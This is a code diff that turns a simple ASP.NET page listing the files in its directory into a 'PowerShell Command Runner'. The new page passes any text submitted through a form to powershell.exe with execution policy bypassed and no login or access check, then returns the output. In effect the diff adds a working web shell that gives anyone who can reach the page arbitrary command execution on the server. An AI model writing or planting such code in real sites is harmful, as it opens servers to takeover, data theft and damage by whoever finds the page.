@@ -2,46 +2,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>File List (No CodeBehind)</title>
+    <title>PowerShell Command Runner</title>
     <style>
         body {
-            font-family: Arial;
+            font-family: Consolas, monospace;
+            background-color: #1e1e1e;
+            color: #00ff00;
             padding: 40px;
-            background: #f4f4f4;
         }
-        #fileList {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            max-width: 600px;
+        #container {
+            max-width: 800px;
             margin: auto;
-            box-shadow: 0px 0px 10px #ccc;
+            background: #2e2e2e;
+            padding: 20px;
+            border-radius: 10px;
         }
-        h2 {
-            text-align: center;
+        textarea, input, button {
+            width: 100%;
+            margin-top: 10px;
         }
-        ul {
-            padding-left: 20px;
+        textarea {
+            height: 300px;
+            background: black;
+            color: #0f0;
+            padding: 10px;
+            border: none;
+            resize: none;
+        }
+        input {
+            padding: 10px;
+            font-size: 16px;
+        }
+        button {
+            background: #007acc;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div id="fileList">
-        <h2>Files in This Directory</h2>
-        <ul>
-            <%
-                string path = Server.MapPath("./");
-                string[] files = System.IO.Directory.GetFiles(path);
+    <div id="container">
+        <h2>PowerShell Command Runner</h2>
+        <form method="post">
+            <input type="text" name="pscommand" placeholder="Enter PowerShell command (e.g. Get-Process)" />
+            <button type="submit">Run</button>
+        </form>
+        <textarea readonly>
+<%
+    if (IsPostBack && !string.IsNullOrWhiteSpace(Request.Form["pscommand"]))
+    {
+        string cmd = Request.Form["pscommand"];
+        try
+        {
+            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
+            psi.FileName = "powershell.exe";
+            psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + cmd.Replace("\"", "\\\"") + "\"";
+            psi.RedirectStandardOutput = true;
+            psi.RedirectStandardError = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
 
-                foreach (string file in files)
-                {
-                    string fileName = System.IO.Path.GetFileName(file);
-            %>
-                    <li><%= fileName %></li>
-            <%
-                }
-            %>
-        </ul>
+            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
+            {
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+                Response.Write(Server.HtmlEncode(output + error));
+            }
+        }
+        catch (Exception ex)
+        {
+            Response.Write(Server.HtmlEncode("Exception: " + ex.Message));
+        }
+    }
+%>
+        </textarea>
     </div>
 </body>
 </html>
